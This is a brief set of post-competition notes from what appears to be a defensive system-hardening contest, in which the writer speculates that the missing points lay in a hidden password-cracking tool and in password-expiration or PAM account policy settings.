** post-analysis notes **

After analysing the points I got, it looks like the last two points in the competition would have to be in account policy and malware.  these last two must have been fairly hidden as well, as the standard procedures that I use did not take care of them as I expected.  I somewhat expect the final piece of malware to be a hidden copy of `john the ripper` or some other hacking tool, as I filtered through the package lists multiple times without finding anything that seemed to be malicious.  I also half-expect the final account policy point to be a problem with password expiration, maybe even pam configuration, although, after changing (and breaking) the pam configuration, I still hadn't obtained any points.
